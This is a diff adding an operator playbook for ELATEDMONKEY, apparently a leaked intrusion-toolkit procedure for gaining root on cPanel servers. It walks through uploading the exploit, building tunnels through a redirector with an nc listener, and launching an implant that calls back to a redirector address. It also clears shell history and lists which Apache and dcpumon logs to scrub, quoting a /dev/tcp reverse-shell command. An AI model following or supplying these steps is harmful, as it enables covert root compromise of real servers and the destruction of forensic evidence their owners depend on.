@@ -1,0 +1,166 @@
+#
+# ELATEDMONKEY is a local privelege escalation exploit against
+# systems running the cPanel Remote Management Web Interface, at
+# least through version 24, and probably future versions too
+# (althogh that should  be checked before throwing). It has been
+# tested explicitly on cPanel 11.23.3 and 11.24.4 running CentOS
+# 5.2 Linux
+#
+
+
+mx
+:syntax on
+:colorscheme darkblue
+:%s#PATH_TO_ELATEDMONKEY_EXECUTABLE#/current/up/elatedmonkey.1.0.1.1.sh#g
+:%s#WORKING_DIR#/tmp/.scsi#g
+:%s/NOPEN_ON_TARGET/sendmail/g
+:%s/REDIRECTOR_IP/REDIRECTOR_IP/g
+:%s/REDIRECTOR_PORT/random14444-55555-1/g
+:%s/RHP1/random14444-55555-2/g
+'x
+
+#
+# Step 1 - Get on the box with user creds.  If you get on the box
+# with root, stop reading here.  You probably want to put up a
+# user level nopen and run the exploit from a -shell
+#
+
+#
+# Step 2 - figure out who you are and what type of box you are on.
+#
+
+pwd
+-cd WORKING_DIR
+date; date -u; id
+uname -a
+
+#
+# If you are user 'nobody', ELATEDMONKEY should work, if you are
+# a user, ELATEDMONKEY will only work of apache executes scripts
+# as 'nobody', otherwise you will should look into EXUBERENTCALM.
+#
+
+#
+#
+# Step 3 - check that this exploit will work.
+# I should really add a section to check and be sure that apache
+# executes scripts as 'nobody', but that will require developer
+# involvement so this is just a placeholder
+#
+
+
+#
+# Step 4 - put up the file and check its contents
+#
+
+-put PATH_TO_ELATEDMONKEY_EXECUTABLE e.sh
+-lt e.sh
+
+#
+# Step 5 - PROFIT!
+# To make cleaning easier, take a timestamp before you throw the exploit
+#
+
+#
+# Get at least two nopen windows on target, one to throw the exploit and on
+# to set up the tunnels
+#
+
+#
+# in a nopen window on target
+#
+
+-tunnel
+
+r RHP1
+
+#
+# In a window on the redirector box
+#
+
+-nrtun RHP2
+
+#
+# in a local scripted windows
+#
+
+nc -v -l -p RHP1
+
+
+#
+# In your exploit window
+#
+
+-shell
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+date; date -u
+sh e.sh -s 127.0.0.1 RHP1 ; date
+
+#
+# You should not get any output, but you should see a connection
+# through your tunnel and nc should establish a connection
+#
+
+#
+# Check that you are root
+#
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+date; date -u
+pwd
+cd WORKING_DIR ; pwd
+
+#
+# Because of limitations in NOPEN, we need to be sure all our file
+# descriptors are closed, so this is how to do that.  The below lines
+# are designed to be copied and pasted, but it might be better to
+# hand jam them:
+#
+
+MY_PID=`echo -n $$` ls -lart /proc/$MY_PID/fd/
+
+#
+# Once you get the list of pids you have open, close all but 0 1 and 2
+#
+
+exec 4>&- 5>&- 6>&- 7>&- 8>&- 9>&- 10>&- 11>&-
+
+#
+# and when you run nopen, close the remaining file descriptors
+#
+
+PATH=. D=-cREDIRECTOR_IP:REDIRECTOR_PORT NOPEN_ON_TARGET 0>&- 1>&- 2>&-
+
+#
+# From here you should know what to do!
+#
+
+#
+# Cleaning
+#
+
+/usr/local/apache/logs/suexec_log
+        [2009-01-09 05:54:15]: uid: (mailman/mailman) gid: (mailman/mailman) cmd: config_list
+
+/usr/local/apache/logs/access_log
+        127.0.0.1 - - [09/Jan/2009:05:52:32 -0500] "GET /~USER/info.php HTTP/1.0" 200 80
+
+/usr/local/apache/logs/error_log
+        attribute "os" ignored
+        also errors from commands you run
+
+/var/log/dcpumon/toplog.*
+/var/log/dcpumon/<YEAR>/<MONTH>/<DAY>
+        Dcpumon logs process lists and system usage in the every 5 minutes. Any
+        commands executed on the system could end up in these logs. Remove any
+        references to commands such as 'e.sh',
+        '/bin/sh -c /bin/sh > /dev/tcp/1.1.1.1/80 >&0 2>&0', and
+        '/usr/local/apache/bin/suexec mailman mailman config_list -c -i /dev/shm/mem mailman'
+ 
+
